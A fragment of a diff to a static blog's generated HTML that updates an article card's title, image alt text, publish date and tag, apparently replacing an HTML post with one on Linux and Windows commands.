                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="html语言--web前端">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Linux,windows指令">
                         
-                        <span class="card-title">html语言--web前端</span>
+                        <span class="card-title">Linux,windows指令</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -878,7 +892,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-18
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-05
                             </span>
                         <span class="publish-author">
                             
@@ -891,8 +905,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/">
-                        <span class="chip bg-color">理论知识</span>
+                    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                        <span class="chip bg-color">基础知识</span>
                     </a>
                     
                 </div>
